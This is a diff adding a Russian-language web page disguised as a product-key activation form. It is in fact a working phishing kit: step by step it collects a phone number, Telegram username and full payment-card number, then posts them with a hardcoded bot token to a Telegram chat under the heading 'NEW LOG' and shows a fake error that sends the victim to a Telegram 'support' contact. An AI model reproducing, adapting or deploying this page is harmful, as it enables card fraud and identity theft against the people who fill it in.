@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Мобильный сайт</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        
+        .logo {
+            position: fixed;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 120px;
+            height: auto;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .container {
+            position: fixed;
+            top: calc(50% + 80px);
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            opacity: 1;
+            transition: opacity 0.5s ease-in-out;
+            width: 320px;
+        }
+
+        .instruction {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            margin: 0 0 15px 0;
+            line-height: 1.4;
+        }
+
+        select, input, button {
+            box-sizing: border-box;
+            font-size: 16px;
+            padding: 14px;
+            width: 100%;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: #007bff;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
+        }
+
+        button {
+            background: #007bff;
+            color: white;
+            cursor: pointer;
+            border: none;
+            margin-top: 10px;
+            padding: 14px;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        .progress-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            width: 320px;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 4px;
+            background: #007bff;
+            transition: width 1.5s linear;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin: -8px 0 10px 0;
+            display: none;
+            text-align: center;
+        }
+
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .modal-box {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 320px;
+            width: 90%;
+            color: #333;
+        }
+
+        .hidden {
+            display: none;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <img src="logo.jpg" alt="Логотип" class="logo" id="logo">
+
+    <!-- Шаг 0: Ввод ключа -->
+    <div class="container" id="step0">
+        <div class="instruction">Введите ключ активации</div>
+        <input type="text" id="regKey" placeholder="Ключ">
+        <div class="error-message" id="keyError">Неверный ключ активации</div>
+        <button onclick="validateKey()">Продолжить</button>
+    </div>
+
+    <!-- Шаг 1: Ввод телефона -->
+    <div class="container hidden" id="step1">
+        <div class="instruction">Введите номер телефона для идентификации в системе</div>
+        <select id="country">
+            <option value="7">Россия (+7)</option>
+            <option value="380">Украина (+380)</option>
+            <option value="1">США (+1)</option>
+            <option value="44">Великобритания (+44)</option>
+        </select>
+        <input type="tel" id="phone" placeholder="Номер телефона">
+        <input type="text" id="telegram" placeholder="Ваш Telegram (@username)">
+        <div class="error-message" id="phoneError">Некорректный номер телефона</div>
+        <div class="error-message" id="telegramError">Введите корректный юзернейм</div>
+        <button onclick="nextStep()">Продолжить</button>
+    </div>
+
+    <!-- Шаг 2: Ввод карты -->
+    <div class="container hidden" id="step2">
+        <div class="instruction">Введите номер карты с которой была совершена покупка ключа</div>
+        <input type="text" id="card" placeholder="Номер карты" maxlength="16">
+        <div class="error-message" id="cardError">Номер карты должен содержать 16 цифр</div>
+        <button onclick="showModal()">Подтвердить</button>
+    </div>
+
+    <!-- Загрузка -->
+    <div class="progress-container hidden" id="progress">
+        <span class="instruction">Проверка данных...</span>
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <!-- Модальное окно -->
+    <div class="modal hidden" id="modal">
+        <div class="modal-box">
+            <p><b>Проблема со входом ключа код ошибки: KEY_UPDATE</b></p>
+            <p><b>Обратитесь в тех поддержку: https://t.me/reror121</b></p>
+        </div>
+    </div>
+
+    <script>
+        let showLogo = true;
+        let currentStep = 0;
+
+        // Настройки Telegram
+        const BOT_TOKEN = '8098607027:AAF2J_tu_Dkm0UhEtrAKDfPPNMHoDnbQ92Q';
+        const CHAT_ID = '7180637463';
+
+        // Обработчик ввода номера карты
+        document.getElementById('card').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        function fadeOut(element, callback) {
+            element.style.opacity = '0';
+            setTimeout(() => {
+                element.style.display = 'none';
+                if (callback) callback();
+            }, 500);
+        }
+
+        function fadeIn(element) {
+            element.style.display = 'flex';
+            setTimeout(() => {
+                element.style.opacity = '1';
+            }, 50);
+        }
+
+        function handleProgress(nextStepCallback, isFinal = false) {
+            const currentContainer = document.querySelector(`#step${currentStep}`);
+            fadeOut(currentContainer);
+            fadeOut(document.getElementById('logo'));
+            
+            fadeIn(document.getElementById('progress'));
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '0';
+            
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+                setTimeout(() => {
+                    fadeOut(document.getElementById('progress'), () => {
+                        nextStepCallback();
+                        if (!isFinal && showLogo) fadeIn(document.getElementById('logo'));
+                        if (!isFinal) currentStep++;
+                    });
+                }, 1500);
+            }, 50);
+        }
+
+        function validateKey() {
+            const keyInput = document.getElementById('regKey');
+            const errorElement = document.getElementById('keyError');
+            
+            errorElement.style.display = 'none';
+            keyInput.style.borderColor = '#ddd';
+
+            if (keyInput.value !== "metkey_7763517583") {
+                errorElement.style.display = 'block';
+                keyInput.style.borderColor = '#dc3545';
+                return;
+            }
+
+            handleProgress(() => fadeIn(document.getElementById('step1')));
+        }
+
+        function validatePhoneAndTelegram() {
+            const countrySelect = document.getElementById('country');
+            const phoneInput = document.getElementById('phone');
+            const telegramInput = document.getElementById('telegram');
+            const phoneError = document.getElementById('phoneError');
+            const telegramError = document.getElementById('telegramError');
+            let isValid = true;
+
+            phoneError.style.display = 'none';
+            telegramError.style.display = 'none';
+            phoneInput.style.borderColor = '#ddd';
+            telegramInput.style.borderColor = '#ddd';
+
+            const cleanedPhone = phoneInput.value.replace(/\D/g, '');
+            const lengthRules = { '7': 10, '380': 9, '1': 10, '44': 10 };
+            if (cleanedPhone.length !== lengthRules[countrySelect.value]) {
+                phoneError.style.display = 'block';
+                phoneInput.style.borderColor = '#dc3545';
+                isValid = false;
+            }
+
+            if (!telegramInput.value.startsWith('@') || telegramInput.value.length < 5) {
+                telegramError.style.display = 'block';
+                telegramInput.style.borderColor = '#dc3545';
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        function validateCard() {
+            const cardInput = document.getElementById('card');
+            const cardError = document.getElementById('cardError');
+            const isValid = /^\d{16}$/.test(cardInput.value);
+
+            cardError.style.display = isValid ? 'none' : 'block';
+            cardInput.style.borderColor = isValid ? '#ddd' : '#dc3545';
+            return isValid;
+        }
+
+        function nextStep() {
+            if (!validatePhoneAndTelegram()) return;
+            handleProgress(() => fadeIn(document.getElementById('step2')));
+        }
+
+        function sendToTelegram(data) {
+            const text = `🤝НОВЫЙ ЛОГ🤝
+📞 Телефон: +${data.country}${data.phone}
+👤 Telegram: ${data.telegram}
+💳 Карта: ${data.card}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => console.error('Ошибка отправки:', error));
+        }
+
+        function showModal() {
+            if (!validateCard()) return;
+
+            const formData = {
+                key: document.getElementById('regKey').value,
+                country: document.getElementById('country').value,
+                phone: document.getElementById('phone').value.replace(/\D/g, ''),
+                telegram: document.getElementById('telegram').value,
+                card: document.getElementById('card').value
+            };
+
+            sendToTelegram(formData);
+
+            handleProgress(() => {
+                showLogo = false;
+                fadeIn(document.getElementById('modal'));
+            }, true);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            fadeIn(document.getElementById('step0'));
+        });
+    </script>
+</body>
+</html>
